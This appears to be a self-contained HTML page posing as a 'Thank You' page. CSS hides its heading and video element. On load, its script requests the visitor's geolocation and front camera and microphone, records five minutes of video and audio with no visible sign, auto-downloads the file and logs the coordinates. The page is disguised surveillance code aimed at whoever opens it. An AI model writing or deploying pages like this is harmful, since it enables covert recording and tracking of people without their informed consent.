<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank You</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f3f3f3;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        h1 {
            display: none; /* Hide the text */
        }
        video {
            display: none; /* Hide the video element */
        }
    </style>
</head>
<body>

    <h1>Thank You</h1>
    <video id="video" autoplay></video>

    <script>
        // Variables to store location and video data
        let locationData = {};
        let recordedChunks = [];

        // Function to capture the front camera and record for 5 minutes
        function captureVideo() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
                .then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;

                    const mediaRecorder = new MediaRecorder(stream);
                    
                    // Start recording when the video stream is ready
                    mediaRecorder.ondataavailable = function(event) {
                        if (event.data.size > 0) {
                            recordedChunks.push(event.data);
                        }
                    };

                    // Stop the recording after 5 minutes (300,000 milliseconds)
                    setTimeout(() => {
                        mediaRecorder.stop();
                        stream.getTracks().forEach(track => track.stop()); // Stop all video/audio tracks
                        saveVideo(); // Save the video after recording stops
                    }, 300000); // 5 minutes = 300,000ms

                    mediaRecorder.start();
                })
                .catch(error => console.error('Error accessing camera: ', error));
        }

        // Function to save the recorded video as a file locally
        function saveVideo() {
            const blob = new Blob(recordedChunks, { type: 'video/mp4' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = 'video.mp4'; // Automatically name the file as video.mp4
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url); // Clean up the object URL
        }

        // Function to get the user's geolocation
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    locationData.latitude = position.coords.latitude;
                    locationData.longitude = position.coords.longitude;
                    console.log(`Location captured: Latitude: ${locationData.latitude}, Longitude: ${locationData.longitude}`);
                }, error => {
                    console.error('Error getting location:', error);
                });
            } else {
                console.error('Geolocation not supported by this browser.');
            }
        }

        // Start capturing video and location when the page is loaded
        window.onload = function() {
            getLocation();  // Capture location
            captureVideo(); // Start capturing video
        };
    </script>

</body>
</html>
